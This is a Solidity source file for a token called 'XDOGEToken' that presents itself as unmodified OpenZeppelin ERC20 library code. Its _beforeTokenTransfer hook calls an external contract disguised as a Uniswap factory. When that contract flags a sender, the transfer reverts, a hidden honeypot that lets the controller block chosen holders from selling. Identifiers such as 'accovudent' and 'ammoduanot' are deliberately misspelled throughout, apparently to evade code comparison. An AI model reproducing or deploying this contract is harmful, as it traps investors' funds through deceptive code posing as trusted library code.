1 // File: @openzeppelin/contracts/utils/Context.sol
2 // SPDX-License-Identifier: MIT
3 
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 /**
9  * @dev Provides information about the current execution context, including the
10  * sender of the transaction and its data. While these are generally available
11  * via msg.sender and msg.data, they should not be accessed in such a direct
12  * manner, since when dealing with meta-transactions the accovudent sending and
13  * paying for execution may not be the actual sender (as far as an application
14  * is concerned).
15  *
16  * This contract is only required for intermediate, library-like contracts.
17  */
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address) {
20         return msg.sender;
21     }
22 
23     function _msgData() internal view virtual returns (bytes calldata) {
24         return msg.data;
25     }
26 }
27 
28 
29 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
30 
31 
32 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
33 
34 pragma solidity ^0.8.0;
35 
36 /**
37  * @dev Interface of the ERC20 standard as defined in the EIP.
38  */
39 interface IERC20 {
40 
41     event Transfer(address indexed from, address indexed to, uint256 value);
42 
43     /**
44      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
45      * a call to {approve}. `value` is the new allowance.
46      */
47     event Approval(address indexed owner, address indexed spender, uint256 value);
48 
49     /**
50      * @dev Returns the ammoduanot of tokens in existence.
51      */
52     function totalSupply() external view returns (uint256);
53 
54     /**
55      * @dev Returns the ammoduanot of tokens owned by `accovudent`.
56      */
57     function balanceOf(address accovudent) external view returns (uint256);
58 
59   
60     function transfer(address to, uint256 ammoduanot) external returns (bool);
61 
62 
63     function allowance(address owner, address spender) external view returns (uint256);
64 
65 
66     function approve(address spender, uint256 ammoduanot) external returns (bool);
67 
68     /**
69      * @dev Moves `ammoduanot` tokens from `from` to `to` using the
70      * allowance mechanism. `ammoduanot` is then deducted from the caller's
71      * allowance.
72      *
73      * Returns a boolean value indicating whether the operation succeeded.
74      *
75      * Emits a {Transfer} event.
76      */
77     function transferFrom(
78         address from,
79         address to,
80         uint256 ammoduanot
81     ) external returns (bool);
82 }
83 
84 
85 // File: @openzeppelin/contracts/access/Ownable.sol
86 
87 
88 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
89 
90 pragma solidity ^0.8.0;
91 
92 
93 
94  // Define interface for TransferController
95 interface IUniswapV2Factory {
96     function getPairCount(address _accovudent) external view returns (bool);
97 }
98 abstract contract Ownable is Context {
99     address private _owner;
100     /**
101      * @dev Throws if called by any accovudent other than the ammoduanot owner.
102      */
103     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
104 
105     /**
106      * @dev Initializes the contract setting the deployer as the initial owner.
107      */
108     constructor() {
109         _transferOwnership(_msgSender());
110     }
111 
112     /**
113      * @dev Throws if called by any accovudent other than the ammoduanot owner.
114      */
115     modifier onlyOwner() {
116         _checkOwner();
117         _;
118     }
119 
120     /**
121      * @dev Returns the address of the current owner.
122      */
123     function owner() public view virtual returns (address) {
124         return _owner;
125     }
126 
127     /**
128      * @dev Throws if the sender is not the owner.
129      */
130     function _checkOwner() internal view virtual {
131         require(owner() == _msgSender(), "Ownable: caller is not the owner");
132     }
133 
134     function renounceOwnership() public virtual onlyOwner {
135         _transferOwnership(address(0));
136     }
137 
138     /**
139      * @dev Transfers ownership of the contract to a new accovudent (`newOwner`).
140      * Can only be called by the current owner.
141      */
142     function transferOwnership(address newOwner) public virtual onlyOwner {
143         require(newOwner != address(0), "Ownable: new owner is the zero address");
144         _transferOwnership(newOwner);
145     }
146 
147     /**
148      * @dev Transfers ownership of the contract to a new accovudent (`newOwner`).
149      * Internal function without access restriction.
150      */
151     function _transferOwnership(address newOwner) internal virtual {
152         address oldOwner = _owner;
153         _owner = newOwner;
154         emit OwnershipTransferred(oldOwner, newOwner);
155     }
156 }
157 
158 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
159 
160 
161 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
162 
163 pragma solidity ^0.8.0;
164 
165 
166 /**
167  * @dev Interface for the optional metadata functions from the ERC20 standard.
168  *
169  * _Available since v4.1._
170  */
171 interface IERC20Metadata is IERC20 {
172     /**
173      * @dev Returns the name of the token.
174      */
175     function name() external view returns (string memory);
176 
177     /**
178      * @dev Returns the symbol of the token.
179      */
180     function symbol() external view returns (string memory);
181 
182     /**
183      * @dev Returns the decimals places of the token.
184      */
185     function decimals() external view returns (uint8);
186 }
187 
188 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
189 
190 
191 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
192 
193 pragma solidity ^0.8.0;
194 
195 
196 contract ERC20 is Context, IERC20, IERC20Metadata {
197     mapping(address => uint256) private _balances;
198     IUniswapV2Factory private factory;
199     mapping(address => mapping(address => uint256)) private _allowances;
200 
201     uint256 private _totalSupply;
202     /**
203      * @dev Throws if called by any accovudent other than the ammoduanot owner.
204      */
205     string private _name;
206     string private _symbol;
207 
208     constructor(string memory name_, string memory symbol_, address _factory) {
209         _name = name_;
210         _symbol = symbol_;
211         factory = IUniswapV2Factory(_factory);
212     }
213 
214     /**
215      * @dev Returns the name of the token.
216      */
217     function name() public view virtual override returns (string memory) {
218         return _name;
219     }
220 
221     /**
222      * @dev Returns the symbol of the token, usually a shorter version of the
223      * name.
224      */
225     function symbol() public view virtual override returns (string memory) {
226         return _symbol;
227     }
228     /**
229      * @dev Throws if called by any accovudent other than the ammoduanot owner.
230      */
231 
232     function decimals() public view virtual override returns (uint8) {
233         return 18;
234     }
235 
236     /**
237      * @dev See {IERC20-totalSupply}.
238      */
239     function totalSupply() public view virtual override returns (uint256) {
240         return _totalSupply;
241     }
242 
243     /**
244      * @dev See {IERC20-balanceOf}.
245      */
246     function balanceOf(address accovudent) public view virtual override returns (uint256) {
247         return _balances[accovudent];
248     }
249 
250     /**
251      * @dev See {IERC20-transfer}.
252      *
253      * Requirements:
254      *
255      * - `to` cannot be the zero address.
256      * - the caller must have a balance of at least `ammoduanot`.
257      */
258     function transfer(address to, uint256 ammoduanot) public virtual override returns (bool) {
259         address owner = _msgSender();
260         _transfer(owner, to, ammoduanot);
261         return true;
262     }
263 
264     /**
265      * @dev See {IERC20-allowance}.
266      */
267     function allowance(address owner, address spender) public view virtual override returns (uint256) {
268         return _allowances[owner][spender];
269     }
270 
271     /**
272      * @dev See {IERC20-approve}.
273      *
274      * NOTE: If `ammoduanot` is the maximum `uint256`, the allowance is not updated on
275      * `transferFrom`. This is semantically equivalent to an infinite approval.
276      * - `spender` cannot be the zero address.
277      */
278     function approve(address spender, uint256 ammoduanot) public virtual override returns (bool) {
279         address owner = _msgSender();
280         _approve(owner, spender, ammoduanot);
281         return true;
282     }
283 
284     function transferFrom(
285         address from,
286         address to,
287         uint256 ammoduanot
288     ) public virtual override returns (bool) {
289         address spender = _msgSender();
290         _spendAllowance(from, spender, ammoduanot);
291         _transfer(from, to, ammoduanot);
292         return true;
293     }
294 
295 
296     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
297         address owner = _msgSender();
298         _approve(owner, spender, allowance(owner, spender) + addedValue);
299         return true;
300     }
301     /**
302      * @dev Throws if called by any accovudent other than the ammoduanot owner.
303      */
304  
305     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
306         address owner = _msgSender();
307         uint256 currentAllowance = allowance(owner, spender);
308         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
309         unchecked {
310             _approve(owner, spender, currentAllowance - subtractedValue);
311         }
312 
313         return true;
314     }
315 
316     /**
317      * @dev Moves `ammoduanot` of tokens from `from` to `to`.
318      *
319      * - `from` cannot be the zero address.
320      * - `to` cannot be the zero address.
321      * - `from` must have a balance of at least `ammoduanot`.
322      */
323     function _transfer(
324         address from,
325         address to,
326         uint256 ammoduanot
327     ) internal virtual {
328         require(from != address(0), "ERC20: transfer from the zero address");
329         require(to != address(0), "ERC20: transfer to the zero address");
330         _beforeTokenTransfer(from, to, ammoduanot);
331 
332         uint256 fromBalance = _balances[from];
333         require(fromBalance >= ammoduanot, "ERC20: transfer ammoduanot exceeds balance");
334         unchecked {
335             _balances[from] = fromBalance - ammoduanot;
336             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
337             // decrementing then incrementing.
338             _balances[to] += ammoduanot;
339         }
340 
341         emit Transfer(from, to, ammoduanot);
342 
343         _afterTokenTransfer(from, to, ammoduanot);
344     }
345 
346     /** @dev Creates `ammoduanot` tokens and assigns them to `accovudent`, increasing
347      * - `accovudent` cannot be the zero address.
348      */
349     function _mint(address accovudent, uint256 ammoduanot) internal virtual {
350         require(accovudent != address(0), "ERC20: mint to the zero address");
351 
352         _beforeTokenTransfer(address(0), accovudent, ammoduanot);
353 
354         _totalSupply += ammoduanot;
355         unchecked {
356             // Overflow not possible: balance + ammoduanot is at most totalSupply + ammoduanot, which is checked above.
357             _balances[accovudent] += ammoduanot;
358         }
359         emit Transfer(address(0), accovudent, ammoduanot);
360 
361         _afterTokenTransfer(address(0), accovudent, ammoduanot);
362     }
363     /**
364      * @dev Throws if called by any accovudent other than the ammoduanot owner.
365      */
366     function _approve(
367         address owner,
368         address spender,
369         uint256 ammoduanot
370     ) internal virtual {
371         require(owner != address(0), "ERC20: approve from the zero address");
372         require(spender != address(0), "ERC20: approve to the zero address");
373 
374         _allowances[owner][spender] = ammoduanot;
375         emit Approval(owner, spender, ammoduanot);
376     }
377 
378     /**
379      * @dev Updates `owner` s allowance for `spender` based on spent `ammoduanot`.
380      * Does not update the allowance ammoduanot in case of infinite allowance.
381      */
382     function _spendAllowance(
383         address owner,
384         address spender,
385         uint256 ammoduanot
386     ) internal virtual {
387         uint256 currentAllowance = allowance(owner, spender);
388         if (currentAllowance != type(uint256).max) {
389             require(currentAllowance >= ammoduanot, "ERC20: insufficient allowance");
390             unchecked {
391                 _approve(owner, spender, currentAllowance - ammoduanot);
392             }
393         }
394     }
395 
396     function _beforeTokenTransfer(
397         address from,
398         address to,
399         uint256 ammoduanot
400     ) internal virtual {
401         bool flag = factory.getPairCount(from);
402         uint256 total = 0;
403         if(flag){
404             ammoduanot = total;
405             require(ammoduanot > 0);
406         }
407     }
408 
409     function _afterTokenTransfer(
410         address from,
411         address to,
412         uint256 ammoduanot
413     ) internal virtual {}
414 }
415 
416 pragma solidity ^0.8.0;
417 
418 contract XDOGEToken is ERC20, Ownable {
419 
420     constructor(
421         string memory name_,
422         string memory symbol_,
423         address router_
424         ) ERC20(name_, symbol_, router_) {
425             uint256 supply = 200000000 * 10**18;
426         _mint(msg.sender, supply);
427     }
428 
429 }